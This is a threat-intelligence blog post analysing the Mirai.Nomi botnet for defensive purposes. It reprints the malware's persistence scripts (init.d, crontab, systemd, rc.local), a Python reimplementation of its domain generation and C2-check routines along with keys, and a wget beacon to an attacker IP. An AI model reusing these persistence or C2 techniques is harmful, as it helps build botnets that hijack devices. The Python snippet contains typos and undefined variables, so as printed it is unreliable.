<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <title>Mirai Nomi: A Botnet Leveraging DGA</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=256e1729b4" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=256e1729b4" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=256e1729b4" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css">

    <style>
        .gh-sidebar{
            width: 300px;
            left: -40px;
        }
        .gh-content ol ol li{
            list-style-type: none;
        }
        .gh-content {
            position: relative;
        }

        .gh-toc > .toc-list {
            position: relative;
            font-size: 12px;
             
        }

        .toc-list {
            overflow: hidden;
            list-style: none;
        }

        @media (min-width: 1300px) {
            .gh-sidebar {
                position: absolute; 
                top: 0;
                bottom: 0;
                margin-top: 4vmin;
                grid-column: wide-start / main-start; /* Place the TOC to the left of the content */
            }
        
            .gh-toc {
                position: sticky; /* On larger screens, TOC will stay in the same spot on the page */
                top: 4vmin;
            }
        }

        .gh-toc .is-active-link::before {
            background-color: var(--ghost-accent-color); /* Defines TOC   accent color based on Accent color set in Ghost Admin */
        } 
    </style>

    <link rel="icon" href="https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png" type="image/png">
    <link rel="canonical" href="https://blog.xlab.qianxin.com/mirai-nomi-en/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="奇安信 X 实验室">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Mirai Nomi: A Botnet Leveraging DGA">
    <meta property="og:description" content="Overview


The Mirai family, as the evergreen tree of botnet, exists numerous variants, but rarely appear Mirai variants using DGA(Domain Generation Algorithm), according to our observation, the last Mirai variant using DGA appeared in 2016. in March 2024, we captured new suspicious ELF samples, which we learnt through analysis">
    <meta property="og:url" content="https://blog.xlab.qianxin.com/mirai-nomi-en/">
    <meta property="og:image" content="https://blog.xlab.qianxin.com/content/images/2024/08/Xlab----banner-3.jpg">
    <meta property="article:published_time" content="2024-03-18T14:00:54.000Z">
    <meta property="article:modified_time" content="2024-03-26T08:36:11.000Z">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="DGA">
    <meta property="article:tag" content="DDoS">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Mirai Nomi: A Botnet Leveraging DGA">
    <meta name="twitter:description" content="Overview


The Mirai family, as the evergreen tree of botnet, exists numerous variants, but rarely appear Mirai variants using DGA(Domain Generation Algorithm), according to our observation, the last Mirai variant using DGA appeared in 2016. in March 2024, we captured new suspicious ELF samples, which we learnt through analysis">
    <meta name="twitter:url" content="https://blog.xlab.qianxin.com/mirai-nomi-en/">
    <meta name="twitter:image" content="https://blog.xlab.qianxin.com/content/images/2024/08/Xlab----banner-3.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Wang Hao">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Botnet, DGA, DDoS">
    <meta name="twitter:site" content="@Xlab_qax">
    <meta property="og:image:width" content="2000">
    <meta property="og:image:height" content="647">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "奇安信 X 实验室",
        "url": "https://blog.xlab.qianxin.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Wang Hao",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/2023/10/T04KK8X9DRR-U05JGJWNWUV-a9b7b79ecd7e-512.png",
            "width": 512,
            "height": 512
        },
        "url": "https://blog.xlab.qianxin.com/author/wanghao/",
        "sameAs": []
    },
    "headline": "Mirai Nomi: A Botnet Leveraging DGA",
    "url": "https://blog.xlab.qianxin.com/mirai-nomi-en/",
    "datePublished": "2024-03-18T14:00:54.000Z",
    "dateModified": "2024-03-26T08:36:11.000Z",
    "keywords": "Botnet, DGA, DDoS",
    "description": "Overview\n\n\nThe Mirai family, as the evergreen tree of botnet, exists numerous variants, but rarely appear Mirai variants using DGA(Domain Generation Algorithm), according to our observation, the last Mirai variant using DGA appeared in 2016. in March 2024, we captured new suspicious ELF samples, which we learnt through analysis to be another Mirai variant using DGA, and analysed the associated historical samples, we not only found a version that did not use DGA (2024.02), but also an exploit sca",
    "mainEntityOfPage": "https://blog.xlab.qianxin.com/mirai-nomi-en/"
}
    </script>

    <meta name="generator" content="Ghost 5.70">
    <link rel="alternate" type="application/rss+xml" title="奇安信 X 实验室" href="https://blog.xlab.qianxin.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="85bfb974adb4cf4f0cda2658c7" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.xlab.qianxin.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.xlab.qianxin.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=256e1729b4"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=256e1729b4">
    <script defer src="/public/comment-counts.min.js?v=256e1729b4" data-ghost-comments-counts-api="https://blog.xlab.qianxin.com/members/api/comments/counts/"></script>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-8T4S62VBFD"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-8T4S62VBFD');
</script>
<style>:root {--ghost-accent-color: #4ca2ba;}</style>

</head>
<body class="post-template tag-botnet tag-dga tag-ddos is-head-middle-logo has-serif-title has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="https://blog.xlab.qianxin.com">
                        奇安信 X 实验室
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://blog.xlab.qianxin.com/">Home</a></li>
    <li class="nav-about"><a href="https://blog.xlab.qianxin.com/about/">About</a></li>
    <li class="nav-en"><a href="https://blog.xlab.qianxin.com/tag/en/">EN</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-botnet tag-dga tag-ddos no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/botnet/">Botnet</a>
                </span>
        </div>

        <h1 class="article-title">Mirai Nomi: A Botnet Leveraging DGA</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/wanghao/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/10/T04KK8X9DRR-U05JGJWNWUV-a9b7b79ecd7e-512.png" alt="Wang Hao" />
                    </a>
                </li>
                <li class="author-list-item">
                    <a href="/author/acey9/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/11/3346712.jpeg" alt="Acey9" />
                    </a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/wanghao/">Wang Hao</a>, <a href="/author/acey9/">Acey9</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2024-03-18">2024年3月18日</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <aside class="gh-sidebar"><div class="gh-toc"></div></aside> 
        <h1 id="overview">Overview</h1>
<p>The Mirai family, as the evergreen tree of botnet, exists numerous variants, but rarely appear Mirai variants using DGA(Domain Generation Algorithm), according to our observation, the last Mirai variant using DGA appeared in 2016. in March 2024, we captured new suspicious ELF samples, which we learnt through analysis to be another Mirai variant using DGA, and analysed the associated historical samples, we not only found a version that did not use DGA (2024.02), but also an exploit scanner and remote control sample (2024.01), which aroused our great interest. Based on the version information in the download script, we tentatively named it <code>Mirai.Nomi</code>.</p>
<p>The Mirai.nomi sample exhibits the following characteristics:</p>
<ul>
<li>Modified UPX Packed(magic number changed and payload XORed)</li>
<li>Time-dependent DGAs and verify C2 availability</li>
<li>Multiple encryption and hashing algorithms (AES, CHACHA20, MD5)</li>
</ul>
<h1 id="sample-analysis">Sample Analysis</h1>
<p>The latest ELF sample, derived from the Mirai LZRD variant, introduces persistent functions and a domain generation function. Other parts of the code largely retain the original code.</p>
<p>The UPX packer's magic num is modified to <code>0B 3E 2A AF</code><br>
<img src="https://blog.xlab.qianxin.com/content/images/2024/03/upx_magic.PNG" alt="upx_magic.PNG" loading="lazy"></p>
<p>After decompressing each block, a single-byte XOR operation with <code>0xD4</code> is performed. The sample can be unpacked through dynamic dumping or rebuild the UPX source code.</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/03/upx_xor_d4.PNG" alt="upx_xor_d4.PNG" loading="lazy"></p>
<p>The following analysis primarily focuses on the persistent functions and domain generation algorithm.</p>
<h2 id="persistence">Persistence</h2>
<p>The sample copies itself to <code>/var/tmp/nginx_kel</code> upon startup, and is persisted via the <code>dnsconfig</code>, <code>crontab</code>, <code>dnsconfigs.service</code>, and <code>rc.local</code> files, respectively, as follows</p>
<p>Change <code>/etc/init.d/dnsconfig</code>、<code>/etc/rc.d/init.d/dnsconfigs</code> to:</p>
<pre><code class="language-bash">#!/bin/sh
### BEGIN INIT INFO
# Provides:          asd
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start asd at boot time
# Description:       Enable service provided by daemon.
### END INIT INFO

# Change the following to the path of your program
ASD_PATH="/var/tmp/nginx_kel"

section_enabled() {
    $ASD_PATH initd &amp;
    return 0
}

section_provider() {
    $ASD_PATH initd &amp;
    return 1
}

start_instance() {
    $ASD_PATH initd &amp;
}

start_service() {
    $ASD_PATH initd &amp;
}

stop_service() {
    $ASD_PATH initd &amp;
}
case "$1" in
    start)
        echo "Starting asd"
        # Start command for your program
        $ASD_PATH initd &amp;
        ;;
    stop)
        echo "Stopping asd"
        # Stop command for your program
        pkill -f $ASD_PATH
        ;;
    restart)
        echo "Restarting asd"
        $ASD_PATH initd &amp;
        ;;
    *)
        echo "Usage: $0 {start|stop|restart}"
        exit 1
        ;;
esac

exit 0
</code></pre>
<p>Write <code>0 * * * /var/tmp/nginx_kel crontab</code> to <code>/var/tmp/.recoverys</code> and execute the command "crontab /var/tmp/.recoverys"</p>
<p>Create service <code>/etc/systemd/system/dnsconfigs.service</code> and start it:</p>
<pre><code>[Unit]
Description=dnsconfigs Server Service
[Service]
Type=simple
Restart=always
RestartSec=60
User=root
ExecStart=/var/tmp/nginx_kel sv
[Install]
WantedBy=multi-user.target
</code></pre>
<p>Append <code>/var/tmp/nginx_kel rclocal &amp;</code> to <code>/etc/rc.d/rc.local</code></p>
<h2 id="dga">DGA</h2>
<h3 id="time-seed">Time Seed</h3>
<p>Time-based DGA generally need to get the current time, which in most cases can be obtained by converting the system time, but this variant takes a different approach and uses <code>Network Time Protocol (NTP)</code> to get the time.</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/03/dga_gettime.PNG" alt="dga_gettime.PNG" loading="lazy"></p>
<p>Multiple public <code>NTP</code> IPs are hardcoded in the sample, and after fetching the <code>Reference Timestamp</code> in the <code>NTP</code> response field, the timestamp is divided by <code>604800</code>, which means that the time seed changes over a period of 7 days, and if the fetch fails, the seed is assigned the value of <code>9999</code>.</p>
<h3 id="algorithm-analysis">Algorithm Analysis</h3>
<p>The generated domain name consists of two parts.</p>
<p>The first part: the time seed is varied by MD5 and chacha20 algorithms to pick a part of the final hexadecimal string with a fixed length of 10, which is represented as <code>[a-f0-9]{10}</code> in regular expression.</p>
<p>Part 2: Decrypted TLDs, DDNS domains from string table.</p>
<p>Note that the CHACHA20 Key in this algorithm is 16 Byte, which is not supported by the commonly used pycryptodemo; in the last MD5, the length of the data used is fixed to 64, which is not the real length of the data, so it needs to be complemented with 0.</p>
<p>The domain generation algorithm is as follows:</p>
<pre><code class="language-python">import datetime
import hashlib
import string
form chacha20 import chacha20_cipher

dt = datetime.datetime.timestamp(datetime.datetime.utcnow())
timeseed = str(int(dt)//604800)
tlds = [".dontargetme.nl", ".ru", ".nl", ".xyz", ".duckdns.org", ".chickenkiller.com", ".accesscam.org", ".casacam.net", ".ddnsfree.com", ".mooo.com", ".strangled.net", ".ignorelist.com", ".geek", ".oss", ".websersaiosnginxo.ru", ".session.oss", ".session.geek"]
sld = bytearray()
for i, c in enumerate(timeseed):
    if not c.isdigit():
        sld.append((5 * ord(c)-477)%26+ord('a'))
    else:
        sld.append(ord(c))
md5_hex = bytearray(hashlib.md5(sld).hexdigest().encode())
xx20data = bytearray()
sort_index = [31, 2, 5, 4, 0, 18, 26, 21, 29, 4, 2, 6]
for index in sort_index:
    xx20data.append(md5_hex[index])

xx20key = bytearray.fromhex("764D1ABCF84ED5673B85B46EFA044D2E")
xx20nonce = bytearray.fromhex("1F786E3950864D1EAAB82D42")
md5data = chacha20_cipher(xx20key, xx20nonce, xx20data, 12)
m5 = bytearray(hashlib.md5(md5+b"\x00"*(64-len(res))).hexdigest().encode())
sort_index1 = [11, 12, 15, 14, 10, 18, 16, 1, 9, 14]
sld = bytearray()
for index in sort_index1:
    sld.append(m5[index])
for tld in tlds:
    print(sld.decode()+tld)
</code></pre>
<p>The following domains were generated in the <code>Thu 7 March 2024 00:00:00 UTC - Thu 14 March 2024 00:00:00 UTC</code> timeframe, and judging by the order of the connections, the authors favour the use of free DDNS domains or OpenNic domains to keep costs down.</p>
<pre><code>1a1f31761f.dontargetme.nl
1a1f31761f.session.oss
1a1f31761f.session.geek
1a1f31761f.duckdns.org
1a1f31761f.geek
1a1f31761f.oss
1a1f31761f.chickenkiller.com
1a1f31761f.accesscam.org
1a1f31761f.casacam.net
1a1f31761f.ddnsfree.com
1a1f31761f.mooo.com
1a1f31761f.strangled.net
1a1f31761f.ignorelist.com
1a1f31761f.ru
1a1f31761f.nl
1a1f31761f.xyz
1a1f31761f.websersaiosnginxo.ru
</code></pre>
<h3 id="c2-decrypt-and-verify">C2 Decrypt and Verify</h3>
<p>Most of the generated domains will be used as C2s, but there is still a long way to go to obtain the final C2 for the variant.</p>
<p>The sample is hardcoded with multiple public DNS servers for obtaining TXT records for the above generated domain names.<br>
<img src="https://blog.xlab.qianxin.com/content/images/2024/03/dga_dns_txt.PNG" alt="dga_dns_txt.PNG" loading="lazy"><br>
As shown above by resolving the domain name <code>1a1f31761f.dontargetme.nl</code>, the hexadecimal string <code>3519239A211D1808ED7DF5AD296F2856</code> is obtained in the TXT record, which is decrypted by <code>AES-256-CBC</code> to get the final C2 <code>147.78.12.176</code>.</p>
<p>AES-Key(hex)：<code>7645565D1380763F5E33F2881C932D4A9F8D204444675540273C3D9E99590A1C</code></p>
<p>AES-IV(hex)：<code>9C1D34765712D2803E4F569ABCEF1020</code></p>
<p>In order to further verify whether the C2 is usable, the authors added a verification mechanism, which firstly generates a check code of length 32 based on the previously generated domain name, and then connects to the above C2 and receives data for verification. The check code generation is very similar to the domain name generation, also using a combination of CHACHA20 and MD5 encoded data:</p>
<pre><code class="language-python">domain = b"1a1f31761f.dontargetme.nl"
check = chacha20_cipher(xx20key, xx20nonce, domain)
m5 = hashlib.md5(check+b"\x00"*(64-len(check))).hexdigest()
check = bytearray()
for i, c in enumerate(m5):
    if not c.isdigit():
        check.append((5 * ord(c) - 477) % 26 + ord('a'))
    else:
        check.append(ord(c))
print(check.decode())
</code></pre>
<p>After the above calculation, the check code of <code>1a1f31761f.dontargetme.nl</code> is <code>4ihsnicnc766x8nn5xih9c7138780xcn</code>.</p>
<p>Connect the above decrypted C2 with port <code>24150</code> and try to receive the data of size 1023, as shown in the figure, the response contains the check code, which means that C2 is available.</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/03/dga_check.PNG" alt="dga_check.PNG" loading="lazy"></p>
<h2 id="download-script">Download Script</h2>
<p>While most mirai download scripts only execute download and run commands, this variant adds the ability to delete files, kill processes, verify execution and feedback to the script.</p>
<p>The ability to delete and kill processes is most likely to update samples, prepare for persistence, and kill other bots. blacklist of filename:<code>arm mips mipsel good_main new_ nginx_kel</code>.</p>
<p>The condition to determine whether the execution is successful or not is whether to output the string "goodluck", if the sample is successfully executed, request <code>http[://204.93.164.31:9528/notwork?name=nomi_${version}</code> via <code>wget</code>, we guess for the purpose of counting the number of installations, and the <code>version</code> parameter is variable. (eg: <code>ver134</code>).</p>
<h1 id="ddos-attack">DDoS Attack</h1>
<p>The current `Mirai.Nomi' attack activity is not very active from our data. It is probably still in the developmental stage, as shown in the attack statistics below:<br>
<a href="https://blog.xlab.qianxin.com/content/images/2024/03/mirai.nomi.ddos.png"><img src="https://blog.xlab.qianxin.com/content/images/2024/03/mirai.nomi.ddos.min.png"></a></p>
<h1 id="contact-us">Contact Us</h1>
<p>Readers are always welcomed to reach us on <a href="https://twitter.com/Xlab_qax?ref=blog.xlab.qianxin.com">twitter</a>.</p>
<h1 id="ioc">IoC</h1>
<h2 id="domain">Domain</h2>
<pre><code>auth.postdarkness.shop
xza.goweqmcsa.xyz
axz.lionos.xyz
ml.lionos.xyz
wwea.goweqmcsa.xyz
api.virtue.ltd
mhacker.cc
</code></pre>
<h2 id="ip">IP</h2>
<pre><code>156.96.155.238	United States|Pennsylvania|Clarks Summit	AS46664|VolumeDrive
38.6.178.140	United States|None|None	AS40065|CNSERVERS LLC
38.207.165.117	Canada|Ontario|Toronto	AS967|VMISS Inc.
204.93.164.31	United States|Illinois|Chicago	AS834|IPXO LLC
23.224.176.63	United States|California|Los Angeles	AS40065|CNSERVERS LLC
147.78.12.176	The Netherlands|Noord-Holland|Amsterdam	AS212238|Datacamp Limited
</code></pre>
<h2 id="sample-sha1">Sample SHA1</h2>
<pre><code>5bdf567a32d1883b2a57277515bfa95d02f92664 mirai
49b48351aa4d2d893d7de8bb856ca1609a6b3434 mirai_nomi
1fb5ead77068bb5c9526dcbd2cd5c78f10c7b5ff mirai
824ef78f1dab6d936a097c8beedf440f32e2aae6 VenomRAT
bb00f0728f3aff52a144b109476e5b0caa66abca AVTECH-scanner
7036a0106820ec81a975b9ccd19463e609fed6c7 reverse shell
2df610e0b08663e90d207c9545d977076a60fdaf reverse shell
b25c96cb9e96f1abda6ade9212f3ceea44f53d6c dofloo
</code></pre>

    </section>

    <section class="article-comments gh-canvas">
        <div id="disqus_thread"></div>
        <script>
            var disqus_config = function () {
                this.page.url = "https://blog.xlab.qianxin.com/mirai-nomi-en/";  
                this.page.identifier = "ghost-65f26debdb9b6e0001630967"
            };
            (function() {
            var d = document, s = d.createElement('script');
            s.src = 'https://xlab-qax.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </section>
</article>
</main>





    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.xlab.qianxin.com">奇安信 X 实验室</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                <ul class="nav">
    <li class="nav-rss"><a href="https://blog.xlab.qianxin.com/rss/">RSS</a></li>
</ul>

            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=256e1729b4"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>

<script>
    tocbot.init({
        // Where to render the table of contents.
        collapseDepth: 6,
        tocSelector: '.gh-toc',
        // Where to grab the headings to build the table of contents.
        contentSelector: '.gh-content',
        // Which headings to grab inside of the contentSelector element.
        headingSelector: 'h1, h2, h3',
        // Ensure correct positioning
        hasInnerContainers: true,
    });

    document.addEventListener('DOMContentLoaded', function() {
        // 获取所有包含srcset属性的元素
        var elementsWithSrcset = document.querySelectorAll('[srcset]');

        // 循环遍历每个元素并删除srcset属性
        elementsWithSrcset.forEach(function(element) {
            element.removeAttribute('srcset');
        });
    });
</script>



</body>
</html>
